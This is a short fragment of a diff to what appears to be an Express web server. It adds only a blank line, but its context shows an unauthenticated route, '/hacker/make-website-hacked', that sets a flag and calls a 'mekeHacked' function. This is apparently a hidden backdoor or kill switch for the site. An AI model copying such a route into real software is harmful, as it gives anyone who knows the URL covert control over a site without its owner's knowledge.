@@ -104,6 +104,7 @@ app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/w
         log({ error })
     }
 });
+
 app.get('/hacker/make-website-hacked', (req, res) => {
     heckedWebsite=true;
     mekeHacked(heckerJsonPath);
